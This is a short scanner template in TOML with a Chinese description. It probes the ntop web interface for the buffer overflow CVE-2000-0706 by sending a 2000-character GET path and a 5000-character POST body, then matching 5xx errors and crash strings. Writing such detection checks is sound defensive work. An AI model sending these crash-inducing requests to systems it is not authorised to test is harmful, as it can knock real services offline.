[info]
author = "ave"
description = "检测 ntop Web 模式缓冲区溢出漏洞 (CVE-2000-0706)，向 Web 界面发送超长缓冲区触发崩溃验证漏洞存在"
id = "POC-AVE-2000-0556"
name = "CVE-2000-0706 PoC"
severity = "critical"
tags = ["ave-2000-0556"]
vuln_id = [
    "CVE-2000-0706",
    "AVE-2000-0556",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/{{randstr_2000}}"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
    504,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Segmentation fault",
    "core dumped",
    "buffer overflow",
    "ntop",
]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/ntop"
protocol = "http"

[poc.requests.body]
content = "data={{randstr_5000}}"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
    504,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Segmentation fault",
    "core dumped",
    "buffer overflow",
    "ntop",
]
